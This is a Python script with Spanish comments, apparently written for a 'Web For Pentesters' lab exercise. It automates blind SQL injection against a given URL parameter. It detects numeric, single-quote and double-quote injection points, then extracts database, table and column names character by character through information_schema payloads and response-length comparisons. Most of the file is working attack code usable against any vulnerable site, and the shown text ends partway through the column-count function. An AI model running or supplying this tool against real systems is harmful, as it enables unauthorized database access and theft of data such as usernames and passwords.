

"""
    Título: SQL Injection
    Nombre: Héctor Paredes Benavides
    Descripción: Creamos un programa para automatizar una Blind-base SQL Injection para el ejercicio 1 de Web For Pentesters
    Fecha: 2/3/2023
    Última Modificación: 2/3/2023
"""

# ========== Inclusión de Bibliotecas ==========
import sys
import requests
from prettytable import PrettyTable

# ========== Declaraciones Constantes ==========
DEFAULT_MAX_ITER = 100

CYAN = "\033[0;34m"
GREEN = "\033[0;32m"
YELLOW = "\033[1;33m"
RED = "\033[0;31m"
RESET = "\033[0m"

VULNERABILITY_TYPE_NUMERIC = "NUMERIC"
VULNERABILITY_TYPE_SIMPLE_QUOTES = "SIMPLE_QUOTES"
VULNERABILITY_TYPE_DOUBLE_QUOTES = "DOUBLE_QUOTES"

PARAMS_HELP = "-h"
PARAMS_URL = "-u"
PARAMS_MAX_ITER = "-max-iter"
PARAMS_GET_DBS_NUMBER = "-dbsnumber"
PARAMS_GET_DB_NAME = "-dbname"
PARAMS_GET_TABLES_NUMBER = "-tablesnumber"
PARAMS_DATABASE = "-D"
PARAMS_GET_TABLE_NAME = "-tablename"
PARAMS_GET_COLUMNS_NUMBER = "-columnsnumber"
PARAMS_TABLE = "-T"
PARAMS_GET_COLUMN_NAME = "-columnname"
PARAMS_GET_DATA = "-getdata"

PARAMS_WITH_VALUE = [
    PARAMS_URL, 
    PARAMS_MAX_ITER, 
    PARAMS_GET_DB_NAME, 
    PARAMS_DATABASE, 
    PARAMS_GET_TABLE_NAME, 
    PARAMS_TABLE,
    PARAMS_GET_COLUMN_NAME,
    PARAMS_GET_DATA
]
PARAMS_WITHOUT_VALUE = [
    PARAMS_HELP, 
    PARAMS_GET_DBS_NUMBER, 
    PARAMS_GET_TABLES_NUMBER, 
    PARAMS_GET_COLUMNS_NUMBER
]

ALL_PARAMS = PARAMS_WITH_VALUE + PARAMS_WITHOUT_VALUE

ALL_CHARS = \
    [chr(char) for char in range(ord('a'), ord('z') + 1)] + \
    [chr(char) for char in range(ord('A'), ord('Z') + 1)] + \
    [chr(char) for char in range(ord('0'), ord('9') + 1)] + \
    ["_"]

# ========== Declaraciones Globales ==========
params = {}

# ========== Función Principal Main ==========
"""
    Nombre: Main
    Descripción: Función principal que inicializa el programa
    Parámetros: Ninguno.
    Retorno: Ninguno.
    Precondición: Ninguna.
    Complejidad Temporal: O(n * m) n -> Número de columnas a volcar / m -> Número de filas de la tabla
    Complejidad Espacial: O(n * m) n -> Número de columnas a volcar / m -> Número de filas de la tabla
"""
def main():

    # Inicializamos los parámetros a los valores por defecto y los leemos
    initializeParams()
    evalExecution()
    execute()

# ========== Codificación de Funciones ==========
"""
    Nombre: Initialize Params
    Descripción: Función con la que inicializamos a valores por defecto los parámetros que utiliza el programa
    Parámetros: Ninguno.
    Retorno: Ninguno.
    Precondición: Ninguna.
    Complejidad Temporal: O(1)
    Complejidad Espacial: O(1)
"""
def initializeParams():

    params[PARAMS_HELP] = {
        "value": False,
        "flag": CYAN + PARAMS_HELP + RESET,
        "help": GREEN + "Muestra la ayuda de uso del programa" + RESET,
        "example": RED + "python3 " + sys.argv[0] + " " + PARAMS_HELP + RESET
    }

    params[PARAMS_URL] = {
        "value": "",
        "flag": CYAN + PARAMS_URL + RESET,
        "help": GREEN + "Define la URL a atacar" + RESET,
        "example": RED + "python3 " + sys.argv[0] + " " + PARAMS_URL + "=www.google.com?param" + RESET,
        "isVulnerable": None,
        "vulnerabilityType": ""
    }

    params[PARAMS_GET_DBS_NUMBER] = {
        "value": False,
        "flag": CYAN + PARAMS_GET_DBS_NUMBER + RESET,
        "help": GREEN + "Obtiene la cantidad de DBs" + RESET,
        "example": RED + "python3 " + sys.argv[0] + " " + PARAMS_GET_DBS_NUMBER + RESET
    }

    params[PARAMS_MAX_ITER] = {
        "value": None,
        "flag": CYAN + PARAMS_MAX_ITER + RESET,
        "help": GREEN + "Establece una cantidad máxima de iteraciones" + RESET,
        "example": RED + "python3 " + sys.argv[0] + " " + PARAMS_MAX_ITER + "=50" + RESET
    }

    params[PARAMS_GET_DB_NAME] = {
        "value": None,
        "flag": CYAN + PARAMS_GET_DB_NAME + RESET,
        "help": GREEN + "Obtiene el nombre de un número de DB" + RESET,
        "example": RED + "python3 " + sys.argv[0] + " " + PARAMS_GET_DB_NAME + "=1/1,3/1-5/" + RESET
    }

    params[PARAMS_GET_TABLES_NUMBER] = {
        "value": False,
        "flag": CYAN + PARAMS_GET_TABLES_NUMBER + RESET,
        "help": GREEN + "Obtiene el número de tablas" + RESET,
        "example": RED + "python3 " + sys.argv[0] + " " + PARAMS_GET_TABLES_NUMBER + RESET
    }

    params[PARAMS_DATABASE] = {
        "value": None,
        "flag": CYAN + PARAMS_DATABASE + RESET,
        "help": GREEN + "Define la base de datos a atacar" + RESET,
        "example": RED + "python3 " + sys.argv[0] + PARAMS_DATABASE + "=users" + RESET
    }

    params[PARAMS_GET_TABLE_NAME] = {
        "value": None,
        "flag": CYAN + PARAMS_GET_TABLE_NAME + RESET,
        "help": GREEN + "Obtiene el nombre de un número de tabla" + RESET,
        "example": RED + "python3 " + sys.argv[0] + " " + PARAMS_GET_TABLE_NAME + "=1/1,3/1-5" + RESET
    }

    params[PARAMS_GET_COLUMNS_NUMBER] = {
        "value": False,
        "flag": CYAN + PARAMS_GET_COLUMNS_NUMBER + RESET,
        "help": GREEN + "Obtiene el número de columnas" + RESET,
        "example": RED + "python3 " + sys.argv[0] + " " + PARAMS_GET_COLUMNS_NUMBER + RESET
    }

    params[PARAMS_TABLE] = {
        "value": None,
        "flag": CYAN + PARAMS_TABLE + RESET,
        "help": GREEN + "Define la tabla a atacar" + RESET,
        "example": RED + "python3 " + sys.argv[0] + " " + PARAMS_TABLE + "=users" + RESET
    }

    params[PARAMS_GET_COLUMN_NAME] = {
        "value": None,
        "flag": CYAN + PARAMS_GET_COLUMN_NAME + RESET,
        "help": GREEN + "Obtiene el nombre de un número de columna" + RESET,
        "example": RED + "python3 " + sys.argv[0] + " " + PARAMS_GET_COLUMN_NAME + "=1/1,3/1-5" + RESET
    }

    params[PARAMS_GET_DATA] = {
        "value": None,
        "flag": CYAN + PARAMS_GET_DATA + RESET,
        "help": GREEN + "Obtiene la información de las columnas indicadas" + RESET,
        "example": RED + "python3 " + sys.argv[0] + " " + PARAMS_GET_DATA + "=username,password" + RESET
    }

"""
    Nombre: Eval Execution
    Descripción: Función con la que evaluamos los parámetros de entrada para ejecutar determinadas funciones del programa
    Parámetros: Ninguno.
    Retorno: Ninguno.
    Precondición: Los parámetros tienen que estar correctamente introducidos
    Complejidad Temporal: O(n) n -> Cantidad de parámetros pasados al programa
    Complejidad Espacial: O(n) n -> Cantidad de parámetros pasados al programa
"""
def evalExecution():

    # Recorremos todos los argumentos y los vamos interpretando
    for i in range(1, len(sys.argv)):

        # Separamos las clave-valor de los argumentos
        paramKeyValueSplitted = sys.argv[i].split("=")

        # Si es un argumento sin valor, lo marcamos como que se ha seleccionado
        if len(paramKeyValueSplitted) == 1 and paramKeyValueSplitted[0] in PARAMS_WITHOUT_VALUE:
            params[paramKeyValueSplitted[0]]["value"] = True
            continue
        
        if len(paramKeyValueSplitted) == 2 and paramKeyValueSplitted[0] in PARAMS_WITH_VALUE:
            # En función de la clave que sea, evaluamos el valor
            if paramKeyValueSplitted[0] in [PARAMS_GET_DB_NAME, PARAMS_GET_TABLE_NAME, PARAMS_GET_COLUMN_NAME]:
                try:
                    if len(paramKeyValueSplitted[1].split("-")) == 1 and ',' not in paramKeyValueSplitted[1]:
                        params[paramKeyValueSplitted[0]]["value"] = [int(paramKeyValueSplitted[1])]
                    elif len(paramKeyValueSplitted[1].split("-")) == 2:
                        params[paramKeyValueSplitted[0]]["value"] = [i for i in range(int(paramKeyValueSplitted[1].split("-")[0]), int(paramKeyValueSplitted[1].split("-")[1]) + 1)]
                    elif len(paramKeyValueSplitted[1].split(",")) > 1:
                        params[paramKeyValueSplitted[0]]["value"] = [int(i) for i in paramKeyValueSplitted[1].split(",")]
                    else:
                        print(RED + "ERROR:" + RESET + " Hay errores en la introducción del parámetro " + paramKeyValueSplitted[0])
                        quit()
                except:
                    print(RED + "ERROR:" + RESET + " No se ha podido interpretar correctamente el parámetro " + paramKeyValueSplitted[0])
                    quit()
            else:
                params[paramKeyValueSplitted[0]]["value"] = paramKeyValueSplitted[1]
            continue

        # En caso de que tenga más = mostramos error y finalizamos el programa
        print(RED + "ERROR:" + RESET + " Ha ocurrido un error intentando interpretar el parámetro " + paramKeyValueSplitted[0] + ", compruebe el uso del programa con -h.")
        quit()

"""
    Nombre: Execute
    Descripción: Función con la que evaluamos el diccionario de parámetros para ejecutar las funciones correspondientes
    Parámetros: Ninguno.
    Retorno: Ninguno.
    Precondición: Se tienen que haber ejecutado previamente initializeParams y evalExecution
    Complejidad Temporal: O(n * m) n -> Número de columnas a volcar / m -> Número de filas de la tabla
    Complejidad Espacial:  O(n * m) n -> Número de columnas a volcar / m -> Número de filas de la tabla
"""
def execute():

    # Si se ha marcado la ayuda la mostramos
    if params[PARAMS_HELP]["value"]:
        printHelp()
    elif params[PARAMS_GET_DBS_NUMBER]["value"]:
        getDBsNumber()
    elif params[PARAMS_GET_DB_NAME]["value"] != None:
        getDBName()
    elif params[PARAMS_GET_TABLES_NUMBER]["value"]:
        getTablesNumber()
    elif params[PARAMS_GET_TABLE_NAME]["value"] != None:
        getTableName()
    elif params[PARAMS_GET_COLUMNS_NUMBER]["value"]:
        getColumnsNumber()
    elif params[PARAMS_GET_COLUMN_NAME]["value"] != None:
        getColumnName()
    elif params[PARAMS_GET_DATA]["value"] != None:
        getData()

"""
    Nombre: Print Help
    Descripción: Función con la que mostramos la ayuda de uso del programa
    Parámetros: Ninguno.
    Retorno: Ninguno.
    Precondicón: Ninguna.
    Complejidad Temporal: O(n) n -> Cantidad de parámetros a mostrar
    Complejidad Espacial: O(1)
"""
def printHelp():

    # Variables necesarias
    table = PrettyTable()
    tableRow = []

    print("\n\n========== AYUDA ==========\n")
    print("Uso: python3 " + sys.argv[0] + " -u=[URL?param] -[PARÁMETRO]=[VALOR] ...\n\n")
    print("Parámetros:\n")
    
    table.border = False
    table.align = "l"
    table.padding_width = 4
    table.field_names = [
        CYAN + "FLAG" + RESET, 
        GREEN + "AYUDA" + RESET, 
        RED + "EJEMPLO" + RESET
    ]

    for param in params:
        tableRow = []
        tableRow.append(params[param]["flag"])
        tableRow.append(params[param]["help"])
        tableRow.append(params[param]["example"])
        table.add_row(tableRow)
        #print(params[param]["flag"] + "\t" + params[param]["help"] + "\t" + params[param]["example"])
    
    print(table)

"""
    Nombre: Check is Vulnerable
    Descripción: Función con la que comprobamos si la URL y el parámetro pasados son vulnerables o no
    Parámetros: Ninguno.
    Retorno: True si es vulnerable y False si no lo es
    Precondición: La URL debe ser correcta
    Complejidad Temporal: O(1)
    Complejidad Espacial: O(1)
"""
def checkIsVulnerable():

    # Variables necesarias
    response1 = ""
    response2 = ""

    print(CYAN + "[INFO]" + RESET + " Comprobando si la URL '" + params[PARAMS_URL]["value"] + "' es vulnerable...")

    # Comprobamos que tengamos URL introducida
    if params[PARAMS_URL]["value"] == "":
        print(RED + "ERROR:" + RESET + " No ha introducido URL a la que atacar.")
        quit()

    # Realizamos la comprobación de si es vulnerable o no
    # Comprobación de tipo numérico
    print(CYAN + "[INFO]" + RESET + " Comprobando vulnerabilidad de tipo numérica...")
    
    try:
        response1 = requests.get(params[PARAMS_URL]["value"] + "=0 or 1=1").text
        response2 = requests.get(params[PARAMS_URL]["value"] + "=0 or 1=0").text
        if response1 != response2:
            print(GREEN + "[ÉXITO]:" + RESET + " Existe vulnerabilidad de tipo numérica.\n")
            params[PARAMS_URL]["vulnerabilityType"] = VULNERABILITY_TYPE_NUMERIC
            params[PARAMS_URL]["isVulnerable"] = True
            return True
    except:
        print(RED + "ERROR:" + RESET + " No se ha podido realizar la petición a esa URL, ¿Estás seguro de que la has introducido correctamente?")
        quit()
    
    # Comprobación de tipo comillas simples
    print(CYAN + "[INFO]" + RESET + " Comprobando vulnerabilidad de tipo comillas simples...")

    try:
        response1 = requests.get(params[PARAMS_URL]["value"] + "=0' or '1'='1").text
        response2 = requests.get(params[PARAMS_URL]["value"] + "=0' or '1'='0").text
        if response1 != response2:
            print(GREEN + "[ÉXITO]:" + RESET + " Existe vulnerabilidad de tipo comillas simples.\n")
            params[PARAMS_URL]["vulnerabilityType"] = VULNERABILITY_TYPE_SIMPLE_QUOTES
            params[PARAMS_URL]["isVulnerable"] = True
            return True
    except:
        print(RED + "ERROR:" + RESET + " No se ha podido realizar la petición a esa URL, ¿Estás seguro de que la has introducido correctamente?")
        quit()
    
    # Comprobación de tipo comillas dobles
    print(CYAN + "[INFO]" + RESET + " Comprobando vulnerabilidad de tipo comillas dobles...")

    try:
        response1 = requests.get(params[PARAMS_URL]["value"] + '=0" or "1"="1')
        response2 = requests.get(params[PARAMS_URL]["value"] + '=0" or "1"="0')
        if response1 != response2:
            print(GREEN + "[ÉXITO]:" + RESET + " Existe vulnerabilidad de tipo comillas dobles.\n")
            params[PARAMS_URL]["vulnerabilityType"] = VULNERABILITY_TYPE_DOUBLE_QUOTES
            params[PARAMS_URL]["isVulnerable"] = True
            return True
    except:
        print(RED + "ERROR:" + RESET + " No se ha podido realizar la petición a esa URL, ¿Estás seguro de que la has introducido correctamente?")
        quit()
    
    # Si no es vulnerable a ninguno de los 3 tipos entonces no es vulnerable
    print(YELLOW + "[AVISO]" + RESET + " No existe ninguna vulnerabilidad.\n")
    return False

"""
    Nombre: Check Database
    Descripción: Función con la que comprobamos si el parámetro de la base de datos ha sido introducido correctamente
    Parámetros: Ninguno.
    Retorno: True si está correctamente introducida y False si no lo está.
    Precondición: Ninguna.
    Complejidad Temporal: O(1)
    Complejidad Espacial: O(1)
"""
def  checkDatabase():

    # Comprobamos si se nos ha introducido el parámetro de la base de datos
    if params[PARAMS_DATABASE]["value"] == None or params[PARAMS_DATABASE]["value"] == "":
        print(RED + "ERROR:" + RESET + " No se ha introducido correctamente la base de datos a atacar.")
        return False
    
    return True

"""
    Nombre: Check Table
    Descripción: Función con la que comprobamos si el parámetro de la tabla ha sido introducido correctamente
    Parámetros: Ninguno.
    Retorno: True si está correctamente introducida y False si no lo está.
    Precondición: Ninguna.
    Complejidad Temporal: O(1)
    Complejidad Espacial: O(1)
"""
def checkTable():

    # Comprobamos si se nos ha introducido el parámetro de la tabla
    if params[PARAMS_TABLE]["value"] == None or params[PARAMS_TABLE]["value"] == "":
        print(RED + "ERROR:" + RESET + " No se ha introducido correctamente la tabla a atacar.")
        return False

    return True

"""
    Nombre: Set Exploit Start
    Descripción: Función con la que generamos el inicio del exploit en función del tipo de SQL Injection (Numérica / Comilla simple / Comilla doble)
    Parámetros: Ninguno.
    Retorno: [STRING] Inicio del exploit
    Predondición: Ninguna.
    Complejidad Temporal: O(1)
    Complejidad Espacial: O(1)
"""
def setExploitStart():

    # Variables necesarias
    exploitStart = ""

    # Evaluamos el tipo de vulnerabilidad y establecemos el inicio del exploit
    if params[PARAMS_URL]["vulnerabilityType"] == VULNERABILITY_TYPE_NUMERIC:
        exploitStart = "=0 or (1=1 "
    elif params[PARAMS_URL]["vulnerabilityType"] == VULNERABILITY_TYPE_SIMPLE_QUOTES:
        exploitStart = "=0' or ('1'='1' "
    elif params[PARAMS_URL]["vulnerabilityType"] == VULNERABILITY_TYPE_DOUBLE_QUOTES:
        exploitStart = '=0" or ("1"="1" '
    else:
        print(RED + "ERROR:" + RESET + " No se ha podido interpretar correctamente el tipo de vulnerabilidad.")
        quit()
    
    return exploitStart

"""
    Nombre: Set Iters
    Descripción: Función con la que establecemos el número máximo de iteraciones a realizaar, ya sea por parámetro o por defecto
    Parámetros: Ninguno.
    Retorno: [INT] Número máximo de iteraciones
    Precondición: Ninguna.
    Complejidad Temporal: O(1)
    Complejidad Espacial: O(1)
"""
def setIters():

    # Variables necesarias
    iters = 0

    # Comprobamos max-iters y establecemos las iteraciones correspondientes
    try:
        if params[PARAMS_MAX_ITER]["value"] == None or int(params[PARAMS_MAX_ITER]["value"]) <= 0:
            print(YELLOW + "[AVISO]" + RESET + " el parámetro max-iter no ha sido establecido o este es erroneo, se ha establecido el valor por defecto (" + str(DEFAULT_MAX_ITER) + ").")
            iters = DEFAULT_MAX_ITER
        else:
            iters = int(params[PARAMS_MAX_ITER]["value"])
    except:
        print(RED + "ERROR:" + RESET + " No se ha podido interpretar correctamente la flag max-iter, se establecerán las iteraciones máximas por defecto.")
        iters = DEFAULT_MAX_ITER
    
    return iters

"""
    Nombre: Get False Content Length
    Descripción: Función con la que obtenemos la longitud de respuesta de una petición falsa contra la base de datos
    Parámetros: 
        0: [STRING] Inicio del exploit
    Retorno: [INT] Longitud de la respuesta
    Precondición: La URL debe ser correcta
    Complejidad Temporal: O(1)
    Complejidad Espacial: O(1)
"""
def getFalseContentLength(exploitStart):

    # Variables necesarias
    falseContentLength = 0

    # Realizamos la petición y comprobamos el Content-Length
    try:
        falseContentLength = len(requests.get(params[PARAMS_URL]["value"] + exploitStart + " and 1=0) -- -").text)
    except:
        print(RED + "ERROR:" + RESET + " No se ha podido enviar la petición para obtener el Content-Length falso.")
        quit()
    
    return falseContentLength

"""
    Nombre: Get DBs Number
    Descripción: Función con la que obtenemos la cantidad de bases de datos que hay
    Parámetros: Ninguno.
    Retorno: Ninguno.
    Precondición: La URL debe ser correcta y el parámetro debe ser vulnerable
    Complejidad Temporal: O(n) n -> Cantidad de iteraciones establecidas
    Complejidad Espacial: O(1)
"""
def getDBsNumber():

    # Variables necesarias
    exploitStart = ""
    exploit = ""
    iters = 0
    falseContentLength = 0
    contentLength = 0

    # Comprobamos si es vulnerable
    if not checkIsVulnerable():
        quit()
    
    # Asignamos el inicio del exploit en función del tipo de vulnerabilidad
    exploitStart = setExploitStart()
    
    # Comprobamos el estado de la flag max-iter
    iters = setIters()
    
    # Obtenemos el content length del caso false
    falseContentLength = getFalseContentLength(exploitStart)
    
    # Ejecutamos el exploit para encontrar por fuerza bruta el número de bases de datos
    print(CYAN + "[INFO]" + RESET + " Iniciando exploit para la obtención de número de bases de datos...")

    for i in range(1, iters + 1):
        # Ejecutamos el exploit
        exploit = exploitStart + "and (select count(schema_name) from information_schema.schemata)=" + str(i) + ") -- -"
        try:
            contentLength = len(requests.get(params[PARAMS_URL]["value"] + exploit).text)
        except:
            print(RED + "ERROR:" + RESET + " No se ha podido realizar la petición al servidor.")

        # Si el content length no coincide con el content length falso es que es true y hemos encontrado el valor esperado
        if contentLength != falseContentLength:
            print(GREEN + "[ÉXITO]" + RESET + " Número de bases de datos encontrado: " + YELLOW + str(i) + RESET)
            quit()
    
    print(YELLOW + "[AVISO]" + RESET + " No se ha podido encontrar el número de bases de datos, prueba a aumentar el max-iter o puede que el parámetro no sea inyectable.")
    quit()

"""
    Nombre: Get DB Name
    Descripción: Función con la que obtenemos el nombre de las bases de datos
    Parámetros: Ninguno.
    Retorno: Ninguno.
    Precondición: La URL debe ser correcta y el parámetro vulnerable, y los números de las bases de datos a obtener deben ser correctos
    Complejidad Temporal: O(n) n -> Cantidad de bases de datos
    Complejidad Espacial: O(n) n -> Cantidad de bases de datos
"""
def getDBName():

    # Variables necesarias
    exploitStart = ""
    exploit = ""
    iters = 0
    falseContentLength = 0
    contentLength = 0
    dbNameLength = 0
    dbName = ""
    dbNames = []
    table = None
    tableRow = []

    # Comprobamos si es vulnerable
    if not checkIsVulnerable():
        quit()
    
    # Asignamos el inicio del exploit en función del tipo de vulnerabilidad
    exploitStart = setExploitStart()
    
    # Comprobamos el estado de la flag max-iter
    iters = setIters()
    
    # Obtenemos el content length del caso false
    falseContentLength = getFalseContentLength(exploitStart)

    # Ejecutamos el exploit para obtener por fuerza bruta los nombres de las bases de datos
    print(CYAN + "[INFO]" + RESET + " Iniciando exploit para la obtención de los nombres de las bases de datos...\n")

    try:
        # Para cada número de la base de datos a comprobar
        for dbnumber in params[PARAMS_GET_DB_NAME]["value"]:

            dbNameLength = 0

            # Buscamos la longitud de la palabra
            print(CYAN + "[INFO]" + RESET + " Buscando la longitud del nombre de la base de datos " + str(dbnumber) + "...")
            for i in range(1, iters + 1):
                exploit = exploitStart + "and (select length(schema_name) from information_schema.schemata limit " + str(dbnumber - 1) + ",1)=" + str(i) + ") -- -"
                try:
                    contentLength = len(requests.get(params[PARAMS_URL]["value"] + exploit).text)
                except:
                    print(RED + "ERROR:" + RESET + " No se ha podido realizar la petición al servidor.")

                if contentLength != falseContentLength:
                    print(GREEN + "[ÉXITO]" + RESET + " Se han detectado " + YELLOW + str(i) + RESET + " carácteres para la base de datos con número " + str(dbnumber) + ".")
                    dbNameLength = i
                    break
            
            # Si no se encontró la longitud lo mostramos y saltamos de elemento
            if dbNameLength == 0:
                print(YELLOW + "[AVISO]" + RESET + " No se ha obtenido la longitud del nombre de la base de datos número " + str(dbnumber) + ". Prueba a aumentar el max-iter o puede que la base de datos no esté bien introducida. Saltando a la siguiente base de datos")
                continue
                
            # Ejecutamos el exploit para obtener su nombre
            # Recorremos todas las posiciones del tamaño del nombre de la base de datos
            print(CYAN + "[INFO]" + RESET + " Obteniendo el nombre de la base de datos con número " + str(dbnumber) + "...")

            dbName = ""

            for pos in range(1, dbNameLength + 1):
            
                # Recorremos la lista de carácteres buscando el que coincide
                for char in ALL_CHARS:
                    exploit = exploitStart + "and ascii(substring((select schema_name from information_schema.schemata limit " + str(dbnumber - 1) + ",1)," + str(pos) + ",1))=" + str(ord(char)) + ") -- -"
                    try:
                        contentLength = len(requests.get(params[PARAMS_URL]["value"] + exploit).text)
                    except:
                        print(RED + "ERROR:" + RESET + " No se ha podido realizar la petición al servidor.")

                    if contentLength != falseContentLength:
                        dbName = dbName + char
                        break
            
            print(GREEN + "[ÉXITO]" + RESET + " Encontrado nombre de la base de datos con número " + str(dbnumber) + ": " + YELLOW + dbName + RESET + "\n")
            dbNames.append({
                "number": dbnumber,
                "element": dbName
            })
        
        # Mostramos las bases de datos en una tabla
        print("\n\n----- BASES DE DATOS ENCONTRADAS -----\n\n")

        table = PrettyTable()
        table.align = "l"
        table.field_names = ["Nº DB", "Nombre DB"]

        for db in dbNames:
            tableRow = [db["number"], db["element"]]
            table.add_row(tableRow)
        
        print(table)

    except:
        print(RED + "ERROR:" + RESET + " No se ha podido ejecutar el exploit correctamente, comprueba que los números de las bases de datos son correctos.")

"""
    Nombre: Get Tables Number
    Descripción: Función con la que obtenemos la cantidad de tablas
    Parámetros: Ninguno.
    Retorno: Ninguno.
    Precondición: La URL debe ser correcta y el parámetro vulnerable, la base de datos a atacar debe ser correcta
    Complejidad Temporal: O(n) n -> Número de iteraciones establecidas
    Complejidad Espacial: O(1)
"""
def getTablesNumber():

    # Variables necesarias
    exploitStart = ""
    exploit = ""
    iters = 0
    falseContentLength = 0
    contentLength = 0

    # Comprobamos que el parámetro sea vulnerable y que el usuario nos haya introducido la base de datos a atacar
    if not checkIsVulnerable() or not checkDatabase():
        quit()

    # Asignamos el inicio del exploit en función del tipo de vulnerabilidad
    exploitStart = setExploitStart()

    # Comprobamos el estado de la flag max-iter
    iters = setIters()

    # Obtenemos el Content-Length del caso false
    falseContentLength = getFalseContentLength(exploitStart)

    # Ejecutamos el exploit para la obtención del número de tablas
    print(CYAN + "[INFO]" + RESET + " Iniciando exploit para la obtención del número de tablas...")

    for i in range(1, iters + 1):
        # Ejecutamos el exploit
        #"and (select count(table_name) from information_schema.tables where table_schema='exercises')=1) -- -"
        exploit = exploitStart + "and (select count(table_name) from information_schema.tables where table_schema='" + params[PARAMS_DATABASE]["value"] + "')=" + str(i) + ") -- -"
        try:
            contentLength = len(requests.get(params[PARAMS_URL]["value"] + exploit).text)
        except:
            print(RED + "ERROR:" + RESET + " No se ha podido realizar la petición al servidor.")
        
        if contentLength != falseContentLength:
            print(GREEN + "[ÉXITO]" + RESET + " Número de tablas encontradas para la base de datos " + YELLOW + params[PARAMS_DATABASE]["value"] + RESET + ": " + YELLOW + str(i) + RESET)
            quit()
    
    print(YELLOW + "[AVISO]" + RESET + " No se ha podido encontrar el número de tablas para la base de datos " + params[PARAMS_DATABASE]["value"] + ", prueba a aumentar el max-iter o puede que la base de datos no esté bien introducida.")

"""
    Nombre: Get Table Name
    Descripción: Función con la que obtenemos los nombres de las tablas
    Parámetros: Ninguno.
    Retorno: Ninguno.
    Precondición: La URL debe ser correcta y el parámetro vulnerable, la base de datos a atacar y los números de las tablas deben ser correctos
    Complejidad Temporal: O(n) n -> Cantidad de tablas
    Complejidad Espacial: O(n) n -> Cantidad de tablas
"""
def getTableName():

    # Variables necesarias
    exploitStart = ""
    exploit = ""
    iters = 0
    falseContentLength = 0
    contentLength = 0
    tableNameLength = 0
    tableName = ""
    tableNames = []
    table = None
    tableRow = []

    # Comprobamos que el parámetro sea vulnerable y que el usuario nos haya introducido la base de datos a atacar
    if not checkIsVulnerable() or not checkDatabase():
        quit()

    # Establecemos el inicio del exploit en función del tipo de vulnerabilidad
    exploitStart = setExploitStart()

    # Comporbamos el estado de la flag max-iter
    iters = setIters()

    # Obtenemos el Content-Length de un caso false
    falseContentLength = getFalseContentLength(exploitStart)

    # Ejecutamos el exploit para obtener por fuerza bruta los nombres de las tablas
    print(CYAN + "[INFO]" + RESET + " Iniciando exploit para la obtención de nombres de tablas...")

    try:

        # Para cada número de tabla a buscar
        for tableNumber in params[PARAMS_GET_TABLE_NAME]["value"]:

            tableNameLength = 0

            # Buscamos la longitud del nombre de la tabla
            print(CYAN + "[INFO]" + RESET + " Buscando la longitud del nombre de la tabla " + str(tableNumber) + "...")
            for i in range(1, iters + 1):
                # Ejecutamos el exploit
                exploit = exploitStart + "and (select length(table_name) from information_schema.tables where table_schema='" + params[PARAMS_DATABASE]["value"] + "' limit " + str(tableNumber - 1) + ",1)=" + str(i) + ") -- -"
                try:
                    contentLength = len(requests.get(params[PARAMS_URL]["value"] + exploit).text)
                except:
                    print(RED + "ERROR:" + RESET + " No se ha podido realizar la petición al servidor.")
                
                # Comprobamos el content length 
                if contentLength != falseContentLength:
                    tableNameLength = i
                    print(GREEN + "[ÉXITO]" + RESET + " Se han detectado " + YELLOW + str(tableNameLength) + RESET + " carácteres para la tabla con número " + YELLOW + str(tableNumber) + RESET + ".")
                    break
            
            # Si no hemos obtenido la longitud del nombre de la tabla mostramos el aviso y saltamos de elemento
            if tableNameLength == 0:
                print(YELLOW + "[AVISO]" + RESET + " No se ha obtenido la longitud del nombre de la tabla con número " + str(tableNumber) + ". Prueba a aumentar el max-iter, o puede que no hayas introducido correctamente el número de la tabla. Saltando a la siguiente tabla...")
                continue
            
            # Buscamos el nombre por fuerza bruta
            print(CYAN + "[INFO]" + RESET + " Obteniendo el nombre de la tabla con número " + str(tableNumber) + "...")

            tableName = ""

            for pos in range(1, tableNameLength + 1):

                # Recorremos la lista de carácteres buscando el que coincide
                for char in ALL_CHARS:
                    # Ejecutamos el exploit
                    exploit = exploitStart + "and ascii(substring((select table_name from information_schema.tables where table_schema='" + params[PARAMS_DATABASE]["value"] + "' limit " + str(tableNumber - 1) + ",1)," + str(pos) + ",1))=" + str(ord(char)) + ") -- -"
                    try:
                        contentLength = len(requests.get(params[PARAMS_URL]["value"] + exploit).text)
                    except:
                        print(RED + "ERROR:" + RESET + " No se ha podido realizar la petición al servidor.")

                    # Comprobamos el content length
                    if contentLength != falseContentLength:
                        tableName = tableName + char
                        break
            
            # Mostramos el resultado obtenido
            print(GREEN + "[ÉXITO]" + RESET + " Encontrado nombre de la tabla con número " + str(tableNumber) + ": " + YELLOW + tableName + RESET + "\n")
            tableNames.append({
                "number": tableNumber,
                "element": tableName
            })
        
        # Mostramos los nombres de las tablas en una tabla
        print("----- TABLAS ENCONTRADAS -----")

        table = PrettyTable()
        table.align = "l"
        table.field_names = ["Nº Tabla", "Nombre Tabla"]

        for tab in tableNames:
            tableRow = [tab["number"], tab["element"]]
            table.add_row(tableRow)
        
        print(table)

    except:
        print(RED + "ERROR:" + RESET + " No se ha podido ejecutar el exploit correctamente, comprueba que los números de las tablas son correctos.")

"""
    Nombre: Get Columns Number
    Descripción: Función con la que obtenemos el número de columnas
    Parámetros: Ninguno.
    Retorno: Ninguno.
    Precondición: La URL debe ser correcta y el parámetro vulnerable, la base de datos y la tabla a atacar deben ser correctas
    Complejidad Temporal: O(n) n -> Número de iteraciones establecida
    Complejidad Espacial: O(1)
"""
def getColumnsNumber():

    # Variables necesarias
    exploitStart = ""
    exploit = ""
    iters = 0
    falseContentLength = 0
    contentLength = 0

    # Comprobamos que el parámetro sea vulnearble y que el usuario nos haya introducido la base de datos y la tabla a atacar
    if not checkIsVulnerable() or not checkDatabase() or not checkTable():
        quit()
    
    # Establecemos el inicio del exploit en función del tipo de vulnerabilidad
    exploitStart = setExploitStart()

    # Comprobamos el estado de max-iter
    iters = setIters()

    # Obtenemos el Content-Length de un caso false
    falseContentLength = getFalseContentLength(exploitStart)

    # Ejecutamos el exploit para obtener el número de columnas de la tabla
    print(CYAN + "[INFO]" + RESET + " Iniciando exploit para la obtención del número de columnas de la tabla " + params[PARAMS_TABLE]["value"] + "...")

    for i in range(1, iters + 1):
        # Ejecutamos el exploit
        exploit = exploitStart + "and (select count(column_name) from information_schema.columns where table_name='" + params[PARAMS_TABLE]["value"] + "')=" + str(i) + ") -- -"
        try:
            contentLength = len(requests.get(params[PARAMS_URL]["value"] + exploit).text)
        except:
            print(RED + "ERROR:" + RESET + " No se ha podido realizar la petición al servidor.")

        # Comprobamos el content length
        if contentLength != falseContentLength:
            print(GREEN + "[ÉXITO]" + RESET + " Encontradas " + YELLOW + str(i) + RESET + " columnas para la tabla " + YELLOW + params[PARAMS_TABLE]["value"] + RESET + ".")
